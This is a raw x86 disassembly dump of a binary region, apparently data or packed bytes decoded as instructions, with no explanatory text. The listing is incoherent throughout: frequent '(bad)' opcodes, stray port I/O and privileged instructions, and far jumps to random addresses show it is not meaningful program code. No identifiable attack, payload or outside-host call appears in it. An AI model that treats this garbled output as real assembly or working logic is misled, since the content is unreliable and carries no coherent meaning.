  41a20c:	add    DWORD PTR [eax-0x69],esi
  41a20f:	(bad)  
  41a210:	sar    DWORD PTR [esp+eiz*2+0x5d],cl
  41a214:	stos   BYTE PTR es:[edi],al
  41a215:	add    al,0x47
  41a217:	jp     0x41a1bf
  41a219:	je     0x41a1d6
  41a21b:	sub    ecx,esp
  41a21d:	xchg   esi,eax
  41a21e:	mov    esi,0xb15e34fd
  41a223:	sar    DWORD PTR [ebx],0x26
  41a226:	(bad)  
  41a227:	out    dx,al
  41a228:	cld    
  41a229:	mov    eax,ds:0x1012b2bf
  41a22e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41a22f:	out    0xd5,al
  41a231:	shr    BYTE PTR [esi],0xbe
  41a234:	mov    al,ds:0x7173bab3
  41a239:	mov    ebx,0xe6c62a43
  41a23e:	fisttp QWORD PTR [ecx+0x33]
  41a241:	(bad)  
  41a242:	xor    al,BYTE PTR [ebp-0x62]
  41a245:	dec    esi
  41a246:	adc    cl,BYTE PTR [eax-0x49]
  41a249:	das    
  41a24a:	fstp   TBYTE PTR [esi+eiz*4]
  41a24d:	xchg   esp,eax
  41a24e:	rcr    dh,0x5c
  41a251:	cs dec ecx
  41a253:	jne    0x2ac6beb8
  41a259:	(bad)  
  41a25b:	lock leave 
  41a25d:	(bad)  
  41a25e:	sti    
  41a25f:	call   0x233a:0xb33ef72d
  41a266:	das    
  41a267:	cmp    ah,BYTE PTR [ecx+0x6b]
  41a26a:	idiv   dh
  41a26c:	iret   
  41a26d:	fwait
  41a26e:	xchg   DWORD PTR ds:0x91895194,ebp
  41a274:	jae    0x41a255
  41a276:	push   esp
  41a277:	outs   dx,DWORD PTR ds:[esi]
  41a278:	jmp    0xf371f9dc
  41a27d:	mov    al,ds:0xa9c3cfd8
  41a282:	scas   eax,DWORD PTR es:[edi]
  41a283:	aas    
  41a284:	push   cs
  41a285:	sar    DWORD PTR [esi+0x1e80975],cl
  41a28b:	scas   eax,DWORD PTR es:[edi]
  41a28c:	inc    ebx
  41a28d:	adc    dh,BYTE PTR [edx+0x1941363e]
  41a293:	add    edi,DWORD PTR [ecx-0x79]
  41a296:	jle    0x41a2a4
  41a298:	inc    ebp
  41a299:	dec    ebx
  41a29a:	dec    ecx
  41a29b:	jb     0x41a27a
  41a29d:	(bad)  
  41a29e:	sbb    eax,0xc317ab1b
  41a2a3:	in     al,dx
  41a2a4:	inc    ebp
  41a2a5:	(bad)
  41a2a8:	movzx  ecx,BYTE PTR [ebx-0x56324573]
  41a2af:	in     al,0x55
  41a2b1:	fnstcw WORD PTR [eax-0xb13fc9]
  41a2b7:	cli    
  41a2b8:	mov    bh,0x65
  41a2ba:	mov    eax,0x945e2095
  41a2bf:	(bad)  
  41a2c0:	mov    ch,0x78
  41a2c2:	mov    DWORD PTR [ebx],ebp
  41a2c4:	jno    0x41a319
  41a2c6:	or     bh,ch
  41a2c8:	sbb    bh,BYTE PTR [esi-0x5e6bcb5]
  41a2ce:	sti    
  41a2cf:	idiv   dh
  41a2d1:	mov    esp,0x4eeb7f21
  41a2d6:	out    dx,al
  41a2d7:	retf   0x72b1
  41a2da:	aad    0xce
  41a2dc:	jne    0x41a342
  41a2de:	repnz test DWORD PTR [esi],esi
  41a2e1:	pop    esp
  41a2e2:	pop    eax
  41a2e3:	inc    ebx
  41a2e4:	mov    esp,ebx
  41a2e6:	pop    ss
  41a2e7:	add    BYTE PTR gs:[eax-0x1896a7a2],al
  41a2ee:	adc    edi,esp
  41a2f0:	adc    esp,DWORD PTR ds:0x67ad2e8a
  41a2f6:	arpl   dx,bx
  41a2f8:	mov    edx,0x1876af27
  41a2fd:	cwd    
  41a2ff:	mov    al,0x8
  41a301:	nop
  41a302:	xchg   ebp,eax
  41a303:	mov    edi,0x2785ba2c
  41a308:	or     ch,BYTE PTR [edx]
  41a30a:	jge    0x41a33b
  41a30c:	sahf   
  41a30d:	jmp    0x41a2fa
  41a30f:	jg     0x41a34c
  41a311:	adc    dh,BYTE PTR ds:0x61384bc8
  41a317:	add    al,0x14
  41a319:	push   esp
  41a31a:	mov    al,0x16
  41a31c:	jno    0x41a2e0
  41a31e:	mov    WORD PTR [ebp+0x3c],ss
  41a321:	dec    eax
  41a322:	and    DWORD PTR [ebp+0x4e6dffd8],0x2f
  41a329:	pop    es
  41a32a:	out    0xf3,al
  41a32c:	mov    ch,0x70
  41a32e:	rol    DWORD PTR [edx-0x205940db],0x7a
  41a335:	scas   eax,DWORD PTR es:[edi]
  41a336:	mov    ?,WORD PTR [edi+0x4d2a3ba0]
  41a33c:	mov    ds:0xc5fa3d08,eax
  41a341:	mov    ecx,0xedb6749a
  41a346:	push   es
  41a347:	xchg   edi,eax
  41a348:	shl    BYTE PTR [ebx+0x4d319198],1
  41a34e:	stos   DWORD PTR es:[edi],eax
  41a34f:	mov    bl,al
  41a351:	adc    esi,DWORD PTR [esi+0x1f8a25a8]
  41a357:	pop    esp
  41a358:	adc    eax,0x92d3b860
  41a35d:	shl    ebp,cl
  41a35f:	cs mov bh,0x6e
  41a362:	stc    
  41a363:	xchg   esp,eax
  41a364:	(bad)  
  41a365:	or     DWORD PTR [eax-0x47],edi
  41a368:	sahf   
  41a369:	aam    0xc2
  41a36b:	xor    bl,BYTE PTR ds:0x9037773f
  41a371:	test   DWORD PTR [ecx],esp
  41a373:	push   esp
  41a374:	mov    ah,0x5e
  41a376:	ins    BYTE PTR es:[edi],dx
  41a377:	les    edx,FWORD PTR [edx-0x57165d97]
  41a37d:	or     ecx,DWORD PTR [edi+0x11]
  41a380:	aam    0x4f
  41a382:	jecxz  0x41a3d5
  41a384:	and    BYTE PTR [edi+0x1c],bh
  41a387:	aad    0x31
  41a389:	xchg   dh,al
  41a38b:	and    ecx,edx
  41a38d:	cmp    al,0x80
  41a38f:	std    
  41a390:	xor    edx,DWORD PTR [esi+0x66a17312]
  41a396:	fisttp DWORD PTR [ebx+0x6ea6c10c]
  41a39c:	jo     0x41a325
  41a39e:	fdiv   DWORD PTR [ecx]
  41a3a0:	xchg   ecx,eax
  41a3a1:	jns    0x41a38d
  41a3a3:	cld    
  41a3a4:	iret   
  41a3a5:	or     eax,0xae77597f
  41a3aa:	leave  
  41a3ab:	sub    DWORD PTR [ecx-0x13fced88],edx
  41a3b1:	pop    esp
  41a3b2:	std    
  41a3b3:	jge    0x41a41d
  41a3b5:	dec    ebp
  41a3b6:	lea    edx,[ebx+0x233aa961]
  41a3bc:	or     eax,0xe638da71
  41a3c1:	xchg   esp,eax
  41a3c2:	ins    BYTE PTR es:[edi],dx
  41a3c3:	xchg   ebp,eax
  41a3c4:	das    
  41a3c5:	or     ebx,DWORD PTR [ecx+0x20569330]
  41a3cb:	sub    DWORD PTR [ecx],ebp
  41a3cd:	xchg   esp,eax
  41a3ce:	fs loop 0x41a40e
  41a3d1:	adc    al,0xe5
  41a3d3:	(bad)  
  41a3d4:	mov    cl,BYTE PTR ds:0x2c3dabca
  41a3da:	(bad)  
  41a3db:	aam    0xd8
  41a3dd:	mov    es,WORD PTR [ebx-0x1b67b578]
  41a3e3:	icebp  
  41a3e4:	ins    BYTE PTR es:[edi],dx
  41a3e5:	aaa    
  41a3e6:	adc    edi,DWORD PTR [eax+ebp*1+0x71db7985]
  41a3ed:	pop    ebx
  41a3ee:	sar    dh,1
  41a3f0:	push   ds
  41a3f1:	xor    al,0x7c
  41a3f3:	push   ebp
  41a3f4:	fld    TBYTE PTR [eax+0x193c016f]
  41a3fa:	shr    edx,0x81
  41a3fd:	int    0x51
  41a3ff:	push   DWORD PTR [edx]
  41a401:	in     eax,0x91
  41a403:	repnz or eax,0x76ba02f3
  41a409:	xchg   esp,eax
  41a40a:	inc    esp
  41a40b:	inc    eax
  41a40c:	jge    0x41a413
  41a40e:	in     al,0x96
  41a410:	shl    DWORD PTR [ebx],0x1
  41a413:	pop    eax
  41a414:	div    DWORD PTR gs:[eax+eax*8-0x19115040]
  41a41c:	cmp    cl,BYTE PTR [ecx+ebx*2-0x2d]
  41a420:	mov    esp,0xb9343774
  41a425:	call   0x5ba31ea
  41a42a:	pop    esp
  41a42b:	and    eax,0x6e4c27e8
  41a430:	mov    bh,0xe0
  41a432:	not    DWORD PTR [esi]
  41a434:	sar    BYTE PTR [eax-0x73],1
  41a437:	inc    ebx
  41a438:	ss int 0xb5
  41a43b:	imul   esp,DWORD PTR [ecx+eax*2-0x1278d38c],0xffffff82
  41a443:	xchg   edx,eax
  41a444:	out    0x98,eax
  41a446:	out    0xcc,eax
  41a448:	pusha  
  41a449:	dec    esi
  41a44a:	pusha  
  41a44b:	test   BYTE PTR [ecx-0x22cf20c6],dl
  41a451:	adc    DWORD PTR [edi],edx
  41a453:	out    0xec,eax
  41a455:	fiadd  DWORD PTR [ebx]
  41a457:	add    eax,0x32f16f2c
  41a45c:	ret    
  41a45d:	lahf   
  41a45e:	hlt    
  41a45f:	xlat   BYTE PTR ds:[ebx]
  41a460:	scas   al,BYTE PTR es:[edi]
  41a461:	sbb    al,0x78
  41a463:	(bad)  
  41a464:	scas   al,BYTE PTR es:[edi]
  41a465:	mov    ds:0x25d0e681,eax
  41a46a:	jne    0x41a3f1
  41a46c:	(bad)  [edi+0x5f]
  41a46f:	(bad)  
  41a470:	xchg   edx,eax
  41a471:	in     eax,dx
  41a472:	mov    cl,0x55
  41a474:	sub    DWORD PTR [ebx+0x59],ecx
  41a477:	mov    cs,edi
  41a479:	mov    cl,0x63
  41a47b:	cs xchg ebx,esi
  41a47e:	aad    0x25
  41a480:	mov    cl,0x29
  41a482:	mov    ah,0x9e
  41a484:	cmp    DWORD PTR [edx-0x4a],ecx
  41a487:	xchg   esp,eax
  41a488:	mov    bh,0xfa
  41a48a:	inc    ebp
  41a48b:	cmp    eax,0xf6cb0a95
  41a490:	js     0x41a43e
  41a492:	or     DWORD PTR [ebx],ebp
  41a494:	mov    ss,WORD PTR [ebx+edi*4+0x79a926b3]
  41a49b:	dec    esp
  41a49c:	mov    dl,0x8
  41a49e:	jns    0x41a455
  41a4a0:	dec    DWORD PTR [ecx-0x77]
  41a4a3:	and    al,0x60
  41a4a5:	lock adc al,0x16
  41a4a8:	add    ebp,DWORD PTR [edi+0x23]
  41a4ab:	jbe    0x41a478
  41a4ad:	fwait
  41a4ae:	into   
  41a4af:	xchg   edi,eax
  41a4b0:	jmp    0x4311:0x27d921c9
  41a4b7:	push   ebp
  41a4b8:	pop    ebp
  41a4b9:	and    al,0xec
  41a4bb:	leave  
  41a4bc:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41a4bd:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41a4be:	jbe    0x41a4ec
  41a4c0:	(bad)  
  41a4c2:	mov    edx,0x44368f3b
  41a4c7:	retf   0xe44
  41a4ca:	mov    ds:0x156acc8c,eax
  41a4cf:	retf   0xe577
  41a4d2:	iret   
  41a4d3:	mov    ds:0x71579ea5,al
  41a4d8:	shr    BYTE PTR [eax-0x41],cl
  41a4db:	add    ecx,DWORD PTR [eax+eiz*2]
  41a4de:	in     al,dx
  41a4df:	jecxz  0x41a50f
  41a4e1:	push   edi
  41a4e2:	mov    gs,WORD PTR [edi+0xa]
  41a4e5:	shl    DWORD PTR [ecx-0x2dd9e243],0xea
  41a4ec:	shr    DWORD PTR [ecx+esi*2+0x30826113],0xb1
  41a4f4:	push   0x46f09d2f
  41a4f9:	mov    al,BYTE PTR [eax+ebx*4]
  41a4fc:	xchg   ebp,eax
  41a4fd:	sbb    DWORD PTR [esi-0x2259defa],0x4be91020
  41a507:	dec    edx
  41a508:	xchg   edi,eax
  41a509:	cmp    ebp,ebx
  41a50b:	pop    ecx
  41a50c:	movlps xmm1,QWORD PTR [eax+0x1605f8c]
  41a513:	in     eax,0x43
  41a515:	lds    ebp,FWORD PTR [esi+0x6a]
  41a518:	imul   edi,DWORD PTR [edx+0x789c247b],0xfffffff2
  41a51f:	sbb    esp,ecx
  41a521:	mov    ch,0xe6
  41a523:	stos   BYTE PTR es:[edi],al
  41a524:	xchg   edi,eax
  41a525:	lock sub BYTE PTR ds:0xda4f2c64,cl
  41a52c:	lea    eax,[esi-0xd42508]
  41a532:	pop    esp
  41a533:	repnz fdivr st,st(3)
  41a536:	rol    al,1
  41a538:	repz pop edx
  41a53a:	inc    ecx
  41a53b:	jnp    0x41a4d3
  41a53d:	pop    edi
  41a53e:	retf   0xdd03
  41a541:	pop    ebx
  41a542:	es jno 0x41a5b4
  41a545:	gs adc eax,0x97d36b4e
  41a54b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41a54c:	bound  ebp,QWORD PTR [eax-0x4f]
  41a54f:	lock mov al,0x9
  41a552:	cmp    edx,DWORD PTR [esi-0x10]
  41a555:	sbb    esp,DWORD PTR [ebx]
  41a557:	pop    ecx
  41a558:	(bad)
  41a55b:	std    
  41a55c:	neg    BYTE PTR [eax]
  41a55e:	adc    edx,ebx
  41a560:	adc    al,0xe1
  41a562:	inc    esi
  41a563:	cmp    al,0xad
  41a565:	xchg   esp,eax
  41a566:	push   es
  41a567:	ja     0x41a4fc
  41a569:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41a56a:	(bad)  
  41a56b:	jg     0x41a556
  41a56d:	push   edx
  41a56e:	and    DWORD PTR [ecx-0x7801e4a1],esi
  41a574:	jne    0x41a5f5
  41a576:	cwde   
  41a577:	mov    ecx,0x51e0f6c5
  41a57c:	pop    ebx
  41a57d:	sbb    al,0x45
  41a57f:	jmpw   0x37ff
  41a583:	cmp    DWORD PTR [ecx-0x662645c5],0x5f
  41a58a:	into   
  41a58b:	fsubr  DWORD PTR [esi]
  41a58d:	repz loop 0x41a60d
  41a590:	cli    
  41a591:	xor    eax,0x74cc0558
  41a596:	das    
  41a597:	xchg   DWORD PTR [edx-0x185eec89],edx
  41a59d:	push   ss
  41a59e:	lahf   
  41a59f:	in     al,0x41
  41a5a1:	loope  0x41a620
  41a5a3:	retf   0xab62
  41a5a6:	sub    ah,BYTE PTR [eax+0x657c8e34]
  41a5ac:	les    ebp,FWORD PTR [edi+eax*1+0x57]
  41a5b0:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41a5b1:	ss popa 
  41a5b3:	sbb    bl,BYTE PTR [edi+ebp*4-0x2787d2cb]
  41a5ba:	fsub   DWORD PTR [eax-0x5ad927e2]
  41a5c0:	mov    bh,0xbe
  41a5c2:	into   
  41a5c3:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41a5c4:	pop    ecx
  41a5c5:	leave  
  41a5c6:	aam    0x7b
  41a5c8:	pop    ss
  41a5c9:	mov    ds:0x434100b4,al
  41a5ce:	adc    BYTE PTR [esi+0x56],al
  41a5d1:	lods   eax,DWORD PTR ds:[esi]
  41a5d2:	sbb    dl,BYTE PTR [ecx]
  41a5d4:	cwde   
  41a5d5:	pop    ebp
  41a5d6:	mov    ds:0xad5c3c4b,al
  41a5db:	and    DWORD PTR ds:0x1bb5c163,edi
  41a5e1:	cwde   
  41a5e2:	test   DWORD PTR [esi-0x24f25455],ebp
  41a5e8:	je     0x41a5d3
  41a5ea:	fwait
  41a5eb:	loop   0x41a5b0
  41a5ed:	(bad)  
  41a5ef:	cdq    
  41a5f0:	aas    
  41a5f1:	aas    
  41a5f2:	xor    eax,0x908f96d6
  41a5f7:	xor    ah,BYTE PTR [ecx-0x3e7b6fa2]
  41a5fd:	jns    0x41a593
  41a5ff:	(bad)  
  41a600:	ffreep st(4)
  41a602:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41a603:	fs cmp ebx,0x420cfcff
  41a60a:	bound  ebx,QWORD PTR [edi]
  41a60c:	lock inc eax
  41a60e:	ins    BYTE PTR es:[edi],dx
  41a60f:	lods   al,BYTE PTR ds:[esi]
  41a610:	popf   
  41a611:	jnp    0x41a646
  41a613:	sbb    ch,BYTE PTR [edi+edi*4-0x30fd431c]
  41a61a:	push   edi
  41a61b:	push   ecx
  41a61c:	mov    dh,0x90
  41a61e:	lahf   
  41a61f:	imul   eax,DWORD PTR [edi-0x6de2b520],0x5a
  41a626:	stc    
  41a627:	cmc    
  41a628:	fisubr WORD PTR [ecx+edx*8+0x5936340c]
  41a62f:	stc    
  41a630:	mov    edx,DWORD PTR [edi-0x258e96cf]
  41a636:	inc    edx
  41a637:	pop    es
  41a638:	sbb    DWORD PTR [esi-0x479659dd],eax
  41a63e:	mov    ecx,DWORD PTR [esp+edx*8+0x71]
  41a642:	adc    BYTE PTR [ebx-0x7a1ce403],0xc0
  41a649:	sub    BYTE PTR [eax-0x1544e6b],bl
  41a64f:	call   0xd1574560
  41a654:	push   ds
  41a655:	mov    ebp,0xcdb76f6b
  41a65a:	pop    edi
  41a65b:	sub    eax,0xc50eda21
  41a660:	push   ss
  41a661:	add    DWORD PTR [ecx-0x63],edx
  41a664:	out    0x87,eax
  41a666:	pop    ss
  41a667:	rol    BYTE PTR [edi],0xd7
  41a66a:	fidivr WORD PTR [edx]
  41a66c:	(bad)  
  41a66d:	and    BYTE PTR [esi],bl
  41a66f:	and    dl,BYTE PTR [esi-0x24a7a76e]
  41a675:	retf   0x5847
  41a678:	sar    BYTE PTR [edx-0x32],1
  41a67b:	popf   
  41a67c:	call   FWORD PTR [edx+0x71e96005]
  41a682:	repz test DWORD PTR [ebx-0x6fe5de9e],esp
  41a689:	retf   0x1810
  41a68c:	ficom  WORD PTR [ecx+ecx*4]
  41a68f:	ja     0x41a6bc
  41a691:	inc    ebx
  41a692:	dec    edx
  41a693:	cmp    esi,edi
  41a695:	ins    BYTE PTR es:[edi],dx
  41a696:	xchg   ebx,eax
  41a697:	fucom  st(4)
  41a699:	sub    al,0xa4
  41a69b:	and    DWORD PTR [edx],0x7181895a
  41a6a1:	mov    bh,0xdf
  41a6a3:	mov    al,ds:0xbc58aba1
  41a6a8:	lods   al,BYTE PTR ds:[esi]
  41a6a9:	jmp    0x41a63a
  41a6ab:	cmp    dl,0x31
  41a6ae:	inc    ecx
  41a6af:	inc    ebp
  41a6b0:	add    DWORD PTR [ebp-0x25],ebx
  41a6b3:	loope  0x41a661
  41a6b5:	jge    0x41a6f8
  41a6b7:	das    
  41a6b8:	mov    bh,0x49
  41a6ba:	push   cs
  41a6bb:	adc    ch,bl
  41a6bd:	pop    eax
  41a6be:	mov    dl,0x27
  41a6c0:	xor    BYTE PTR [edx-0x314df7e0],dl
  41a6c6:	pop    ss
  41a6c7:	mov    edi,0xb465fb8b
  41a6cc:	test   BYTE PTR [ecx-0x64b863c3],0x93
  41a6d3:	outs   dx,DWORD PTR ds:[esi]
  41a6d4:	mov    ch,0x26
  41a6d6:	ret    
  41a6d7:	adc    eax,0x98f99a98
  41a6dc:	loopne 0x41a735
  41a6de:	fcom   DWORD PTR [ebx-0x14]
  41a6e1:	sbb    esp,DWORD PTR [edx+0x55]
  41a6e4:	dec    ebx
  41a6e5:	sub    BYTE PTR [ebx],ch
  41a6e7:	mov    bl,0xef
  41a6e9:	dec    ebx
  41a6ea:	(bad)  
  41a6eb:	int3   
  41a6ec:	inc    esp
  41a6ed:	jne    0x41a67b
  41a6ef:	loop   0x41a716
  41a6f1:	ins    DWORD PTR es:[edi],dx
  41a6f2:	xchg   esp,eax
  41a6f3:	fild   WORD PTR [ecx]
  41a6f5:	out    0x7a,al
  41a6f7:	sahf   
  41a6f8:	loopne 0x41a6b0
  41a6fa:	shl    DWORD PTR [edi-0x5d],0xd6
  41a6fe:	xor    DWORD PTR [ebx-0x40f5e89c],ecx
  41a704:	push   eax
  41a705:	mov    ebp,0x8d94c997
  41a70a:	sub    BYTE PTR [ebx],dl
  41a70c:	xor    DWORD PTR [ebp+0x74498c04],edi
  41a712:	dec    eax
  41a713:	add    DWORD PTR ds:0x96f5e38,ebp
  41a719:	pop    ss
  41a71a:	dec    edx
  41a71b:	pop    ss
  41a71c:	cmc    
  41a71d:	inc    DWORD PTR [eax+edx*4+0x4f]
  41a721:	(bad)  
  41a723:	xlat   BYTE PTR ds:[ebx]
  41a724:	ss std 
  41a726:	mov    al,ds:0x2a737c74
  41a72b:	pop    esp
  41a72c:	mov    ch,0xb6
  41a72e:	jmp    0x69b2:0xf1547c66
  41a735:	push   ecx
  41a736:	sbb    eax,0x1114c345
  41a73b:	(bad)  
  41a73c:	ins    DWORD PTR es:[edi],dx
  41a73d:	dec    ebp
  41a73e:	or     DWORD PTR [ebx],ebp
  41a740:	push   ss
  41a741:	(bad)  
  41a743:	xor    eax,0x1a98baa2
  41a748:	xor    al,0x4e
  41a74a:	adc    BYTE PTR [esp+ebx*4],dl
  41a74d:	aam    0x6d
  41a74f:	out    dx,al
  41a750:	cmp    dl,BYTE PTR [eax-0x1d24b2cc]
  41a756:	pop    es
  41a757:	stos   DWORD PTR es:[edi],eax
  41a758:	sbb    cl,dl
  41a75a:	js     0x41a7b8
  41a75c:	jns    0x41a6f8
  41a75e:	sbb    bh,al
  41a760:	cli    
  41a761:	and    al,0xe5
  41a763:	xchg   esi,eax
  41a764:	mov    ebx,0x4e1d8ed9
  41a769:	dec    esi
  41a76a:	push   ebx
  41a76b:	sbb    BYTE PTR [ecx-0x52842407],cl
  41a771:	adc    edi,DWORD PTR [ebx-0x19]
  41a774:	jno    0x41a700
  41a776:	in     al,0xaa
  41a778:	mov    ds:0x76297b7a,al
  41a77d:	dec    ecx
  41a77e:	call   0xf28d:0x3dd81612
  41a785:	inc    eax
  41a786:	jae    0x41a74f
  41a788:	mov    cl,0xc7
  41a78a:	xchg   ebx,eax
  41a78b:	sub    eax,0x813ab039
  41a790:	sbb    ebp,ecx
  41a792:	mov    al,0xf8
  41a794:	hlt    
  41a795:	outs   dx,DWORD PTR ds:[esi]
  41a796:	jp     0x41a7b5
  41a798:	cmc    
  41a799:	iret   
  41a79a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41a79b:	inc    edi
  41a79c:	lds    edx,FWORD PTR [edx+0x5f]
  41a79f:	int    0xee
  41a7a1:	enter  0x3690,0x1a
  41a7a5:	ins    BYTE PTR es:[edi],dx
  41a7a6:	aaa    
  41a7a7:	fs jmp 0x5d2094f5
  41a7ad:	dec    ecx
  41a7ae:	pusha  
  41a7af:	xlat   BYTE PTR ds:[ebx]
  41a7b0:	retf   
  41a7b1:	stc    
  41a7b2:	enter  0x2a93,0xa0
  41a7b6:	xor    eax,0x155d14ad
  41a7bb:	pop    ecx
  41a7bc:	lods   eax,DWORD PTR ds:[esi]
  41a7bd:	sbb    bl,BYTE PTR [edi-0x764503ed]
  41a7c3:	jmp    0xaa3c:0x88c256a1
  41a7ca:	dec    esp
  41a7cb:	pop    edx
  41a7cc:	cld    
  41a7cd:	add    al,0x25
  41a7cf:	mov    WORD PTR [edi+eiz*8-0x3f6b8b11],?
  41a7d6:	bound  eax,QWORD PTR [eax-0x2e]
  41a7d9:	fucomp st(5)
  41a7db:	daa    
  41a7dc:	mov    ch,0xdc
  41a7de:	xor    eax,0x2d6cce5c
  41a7e3:	inc    eax
  41a7e4:	mov    cl,BYTE PTR [eax]
  41a7e6:	icebp  
  41a7e7:	scas   eax,DWORD PTR es:[edi]
  41a7e8:	jb     0x41a78d
  41a7ea:	inc    ebp
  41a7eb:	in     eax,0x93
  41a7ed:	sbb    al,0xec
  41a7ef:	je     0x41a793
  41a7f1:	rcr    DWORD PTR [ecx-0x42],0x27
  41a7f5:	or     BYTE PTR [edi-0x10],bh
  41a7f8:	test   BYTE PTR [ebx+0x1390ec2d],dl
  41a7fe:	lods   eax,DWORD PTR ds:[esi]
  41a7ff:	xchg   ebx,eax
  41a800:	jge    0x41a82a
  41a802:	out    dx,al
  41a803:	lock repz or eax,0xfb19ee7
  41a80a:	mov    ds:0x6c13c1ac,al
  41a80f:	mov    gs,WORD PTR [eax+esi*4+0x4]
  41a813:	jg     0x41a7cc
  41a815:	mov    ah,0xdc
  41a817:	mov    ah,0x9d
  41a819:	stc    
  41a81a:	inc    eax
  41a81b:	ret    
  41a81c:	cmp    ebp,eax
  41a81e:	pop    ss
  41a81f:	cld    
  41a820:	sti    
  41a821:	icebp  
  41a822:	fsubr  QWORD PTR [ecx-0x6013f852]
  41a828:	sub    ebp,DWORD PTR [eax+0x6]
  41a82b:	adc    eax,0x7d9cc8aa
  41a830:	pop    edx
  41a831:	push   esi
  41a832:	mov    ebx,ecx
  41a834:	jbe    0x41a834
  41a836:	pop    ebp
  41a837:	repz call 0xfde5:0x6f496f66
  41a83f:	push   ds
  41a840:	shl    bl,0xa1
  41a843:	repnz or DWORD PTR ds:0x6b7e79f0,ecx
  41a84a:	mov    ds:0xfa79cfd5,eax
  41a84f:	mov    ch,dh
  41a851:	push   ecx
  41a852:	(bad)  
  41a853:	or     esp,DWORD PTR [ecx-0xdabc064]
  41a859:	sbb    DWORD PTR ds:0xb780385c,esi
  41a85f:	test   eax,0x7e4914a4
  41a864:	inc    edi
  41a865:	inc    ebx
  41a866:	adc    al,BYTE PTR [eax]
  41a868:	pushf  
  41a869:	or     al,dh
  41a86b:	mov    esi,0xf9f53f4a
  41a870:	pop    ebp
  41a871:	push   cs
  41a872:	sub    al,BYTE PTR [esi-0x42]
  41a875:	call   0x8ce9d72
  41a87a:	fwait
  41a87b:	sbb    esp,DWORD PTR [ebx]
  41a87d:	push   cs
  41a87e:	cmp    BYTE PTR [ebx],bh
  41a880:	mov    edx,esp
  41a882:	push   esp
  41a883:	fmul   QWORD PTR [eax]
  41a885:	xchg   esi,eax
  41a886:	shl    BYTE PTR [edx-0x30c57cc7],cl
  41a88c:	pop    ss
  41a88d:	das    
  41a88e:	sbb    eax,0x9a73ff08
  41a893:	xor    esp,0xffffffa9
  41a896:	jo     0x41a856
  41a898:	dec    edi
  41a899:	xor    BYTE PTR [edx+0x77],ch
  41a89c:	fist   DWORD PTR ds:0x219254e4
  41a8a2:	inc    esp
  41a8a3:	in     al,dx
  41a8a4:	sbb    eax,0xf24d8f44
  41a8a9:	(bad)  
  41a8aa:	mov    ah,0xb4
  41a8ac:	std    
  41a8ad:	ins    DWORD PTR es:[edi],dx
  41a8ae:	mov    bh,0x3c
  41a8b0:	sbb    DWORD PTR [ebx],edx
  41a8b2:	rep ins DWORD PTR es:[edi],dx
  41a8b4:	ds sub esp,edi
  41a8b7:	call   esp
  41a8b9:	lds    ebp,FWORD PTR [edi]
  41a8bb:	repnz dec DWORD PTR [ecx+eax*8-0x31]
  41a8c0:	cmp    al,0x12
  41a8c2:	push   edx
  41a8c3:	mov    dl,0x22
  41a8c5:	fs ret 0x9e19
  41a8c9:	dec    ebx
  41a8ca:	mov    es,WORD PTR [ebp+0x45]
  41a8cd:	ins    BYTE PTR es:[edi],dx
  41a8ce:	dec    ebx
  41a8cf:	sub    al,0x40
  41a8d1:	mov    ss,WORD PTR [esi+0x6a4f7ac9]
  41a8d7:	mov    ch,ch
  41a8d9:	or     ah,BYTE PTR [edi*8-0x2d8f7cd8]
  41a8e0:	jmp    0xd4a:0x57f45b50
  41a8e7:	mov    dl,0x5
  41a8e9:	pop    ss
  41a8ea:	mov    ebx,0x8b7d8d17
  41a8ef:	inc    esi
  41a8f0:	iret   
  41a8f1:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41a8f2:	dec    esp
  41a8f3:	ds inc ecx
  41a8f5:	jne    0x41a890
  41a8f7:	(bad)  
  41a8f8:	js     0x41a93b
  41a8fa:	mov    ebp,0xe4b30809
  41a8ff:	popf   
  41a900:	dec    eax
  41a901:	xchg   DWORD PTR [ebx-0x4de4b96d],eax
  41a907:	mov    si,cx
  41a90a:	mov    cl,0xab
  41a90c:	scas   eax,DWORD PTR es:[edi]
  41a90d:	aas    
  41a90e:	cmp    BYTE PTR [edi],0x39
  41a911:	cld    
  41a912:	mov    bl,0xb
  41a914:	stos   DWORD PTR es:[edi],eax
  41a915:	daa    
  41a916:	fild   WORD PTR [esi+0x5d]
  41a919:	ins    DWORD PTR es:[edi],dx
  41a91a:	adc    BYTE PTR [eax+0x5a96a47f],bl
  41a920:	sbb    ebp,DWORD PTR [edx-0x4ba07f6d]
  41a926:	sub    bl,BYTE PTR ds:0xe9fb5088
  41a92c:	xchg   esp,eax
  41a92d:	sbb    dl,ch
  41a92f:	pushf  
  41a930:	inc    ecx
  41a931:	scas   eax,DWORD PTR es:[edi]
  41a932:	mov    eax,ds:0x3af7cce0
  41a937:	bound  ecx,QWORD PTR [ebx+0x2c70c8f9]
  41a93d:	pop    edx
  41a93e:	push   cs
  41a93f:	mov    edx,DWORD PTR [eax+0x258d16a5]
  41a945:	push   cs
  41a946:	pop    ebx
  41a947:	add    BYTE PTR [esi-0x7d95a70a],0xa9
  41a94e:	int    0x95
  41a950:	jns    0x41a8fa
  41a952:	sbb    al,0x5a
  41a954:	hlt    
  41a955:	jmp    0x29a60ad5
  41a95a:	cdq    
  41a95b:	dec    esp
  41a95c:	dec    ebp
  41a95d:	sub    BYTE PTR [esi],bh
  41a95f:	mov    ds:0x1aa05ce4,al
  41a964:	mov    dh,0xbb
  41a966:	xor    dl,ch
  41a968:	mov    eax,ds:0x6a4d5a1e
  41a96d:	or     eax,0x19a2fc29
  41a972:	jno    0x41a924
  41a974:	pop    esi
  41a975:	imul   esi,DWORD PTR [edi],0x6b
  41a978:	jno    0x41a944
  41a97a:	cmc    
  41a97b:	imul   eax,DWORD PTR [ecx],0x54
  41a97e:	jae    0x41a991
  41a980:	sbb    dh,BYTE PTR [esi]
  41a982:	or     DWORD PTR [ecx],edi
  41a984:	cmp    esi,DWORD PTR [ebx+0x3a832eb4]
  41a98a:	aaa    
  41a98b:	sub    eax,0x45121975
  41a990:	mov    esi,0x2a062bba
  41a995:	push   0xccea7e1
  41a99a:	pop    ecx
